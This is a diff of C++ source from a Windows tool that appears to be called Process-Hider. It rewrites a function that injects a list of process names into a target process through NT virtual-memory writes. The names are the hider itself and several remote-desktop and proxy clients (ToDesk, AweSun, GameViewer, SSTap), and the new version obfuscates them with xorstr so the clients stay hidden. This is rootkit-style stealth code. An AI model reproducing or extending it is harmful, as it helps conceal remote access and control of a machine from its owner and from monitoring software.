@@ -101,74 +101,73 @@ auto ph::external::map_file( unsigned char* file_bytes ) -> void*
 
 auto ph::external::map_param( ) -> void*
 {
-    auto param = ( sdk::loader* ) sdk::handler::allocate( sizeof( sdk::loader ) );
+	auto param = ( sdk::loader* ) sdk::handler::allocate( sizeof( sdk::loader ) );
 
-    param->__is_valid_flag = 0xDEAD;
-    param->process_count = 11;  // 保持和下面列表数量一致
-    // 定义一个本地字符串数组，确保生命周期覆盖整个函数
-    const wchar_t* local_process_names[] = {
-        L"Process-Hider.exe",
-        L"SEWanClt.exe",
-        L"SEBarClt.exe",
-        L"AweSun.exe",
-        L"AskLink.exe",
-        L"AskLinkSession.exe",
-        L"GameViewer.exe",
-        L"GameViewerServer.exe",
-        L"ToDesk.exe",
-        L"Td.exe",
-        L"SSTap.exe"
-    };
+	param->__is_valid_flag = 0xDEAD; // used to indicate that the structure is valid :P
+	param->process_count = 10;
 
-    // 1. 先为每个字符串分配内存（在远程进程中）
-    wchar_t** remote_strings = ( wchar_t** ) sdk::handler::allocate( sizeof( wchar_t* ) * param->process_count );
+	auto local_process_list = ( wchar_t** ) sdk::handler::allocate( sizeof( wchar_t* ) * param->process_count );
 
-    for ( auto i = 0; i < param->process_count; ++i )
-    {
-        // 计算字符串长度（包括终止符）
-        size_t length = wcslen( local_process_names[i] ) + 1;
-        size_t name_size = length * sizeof( wchar_t );
+	/// Here you can add more processes to hide (case-insensitive)
+	/// NOTE: Make sure param->process_count is equal to the number of processes you add
 
-        // 在远程进程分配内存
-        void* remote_string = nullptr;
-        sdk::win::nt_allocate_virtual_memory(
-            process_handle, &remote_string, 0, &name_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+	local_process_list[0] = sdk::wstring( xorstr( L"Process-Hider.exe" ) ).get_data( ); /// 隐藏程序本身
+	local_process_list[1] = sdk::wstring( xorstr( L"SEWanClt.exe" ) ).get_data( ); /// 隐藏同步专家远程版
+	local_process_list[2] = sdk::wstring( xorstr( L"SEBarClt.exe" ) ).get_data( ); /// 隐藏同步专家网吧版
+	local_process_list[3] = sdk::wstring( xorstr( L"AweSun.exe" ) ).get_data( ); /// 隐藏向日葵远程客户端
+	local_process_list[4] = sdk::wstring( xorstr( L"AskLink.exe" ) ).get_data( ); /// 隐藏连连控客户端
+	local_process_list[5] = sdk::wstring( xorstr( L"AskLinkSession.exe" ) ).get_data( ); /// 隐藏连连控服务
+	local_process_list[6] = sdk::wstring( xorstr( L"GameViewer.exe" ) ).get_data( ); /// 隐藏网易UU远程客户端
+	local_process_list[7] = sdk::wstring( xorstr( L"GameViewerServer.exe" ) ).get_data( ); /// 隐藏网易UU远程服务
+	local_process_list[8] = sdk::wstring( xorstr( L"ToDesk.exe" ) ).get_data( ); /// 隐藏Todesk客户端
+    local_process_list[9] = sdk::wstring( xorstr( L"SSTap.exe" ) ).get_data( ); /// 隐藏SSTap代理客户端
 
-        // 写入字符串数据（包括终止符）
-        sdk::win::nt_write_virtual_memory(
-            process_handle, remote_string, local_process_names[i], name_size, nullptr );
+	/// Allocate memory for each process name in the target process
 
-        // 存储远程指针
-        remote_strings[i] = ( wchar_t* ) remote_string;
-    }
+	for ( auto i = 0; i < param->process_count; ++i )
+	{
+		auto process_address = ( void* ) nullptr;
+		auto name_size = ( unsigned __int64 ) WSTRING_LENGTH( local_process_list[i] ) * sizeof( wchar_t );
 
-    // 2. 在远程进程分配字符串指针数组
-    auto remote_process_list = ( void* ) nullptr;
-    auto list_size = ( unsigned __int64 ) sizeof( wchar_t* ) * param->process_count;
+		sdk::win::nt_allocate_virtual_memory(
+			process_handle, &process_address, 0, &name_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
-    sdk::win::nt_allocate_virtual_memory(
-        process_handle, &remote_process_list, 0, &list_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+		sdk::win::nt_write_virtual_memory(
+			process_handle, process_address, local_process_list[i], WSTRING_LENGTH( local_process_list[i] ) * sizeof( wchar_t ), nullptr );
 
-    sdk::win::nt_write_virtual_memory(
-        process_handle, remote_process_list, remote_strings, list_size, nullptr );
+		local_process_list[i] = ( wchar_t* ) process_address;
+	}
 
-    param->processes = ( wchar_t** ) remote_process_list;
+	/// Allocate memory for the process list
 
-    // 3. 分配 param 结构体到远程进程
-    auto param_address = ( void* ) nullptr;
-    auto param_size = ( unsigned __int64 ) sizeof( sdk::loader );
+	auto remote_process_list = ( void* ) nullptr;
+	auto list_size = ( unsigned __int64 ) sizeof( wchar_t* ) * param->process_count;
 
-    sdk::win::nt_allocate_virtual_memory(
-        process_handle, &param_address, 0, &param_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+	sdk::win::nt_allocate_virtual_memory(
+		process_handle, &remote_process_list, 0, &list_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
 
-    sdk::win::nt_write_virtual_memory(
-        process_handle, param_address, param, sizeof( sdk::loader ), nullptr );
+	sdk::win::nt_write_virtual_memory(
+		process_handle, remote_process_list, local_process_list, sizeof( wchar_t* ) * param->process_count, nullptr );
 
-    // 清理本地内存
-    sdk::handler::free( remote_strings );
-    sdk::handler::free( param );
+	param->processes = ( wchar_t** ) remote_process_list;
 
-    return param_address;
+	/// Allocate memory for the param
+
+	auto param_address = ( void* ) nullptr;
+	auto param_size = ( unsigned __int64 ) sizeof( sdk::loader );
+
+	sdk::win::nt_allocate_virtual_memory(
+		process_handle, &param_address, 0, &param_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+
+	sdk::win::nt_write_virtual_memory(
+		process_handle, param_address, param, sizeof( sdk::loader ), nullptr );
+
+	/// Free memory allocated in current process
+
+	sdk::handler::free( local_process_list );
+	sdk::handler::free( param );
+
+	return param_address;
 }
 
 auto ph::external::get_process_pid_by_name( const sdk::string& process_name ) -> __int32
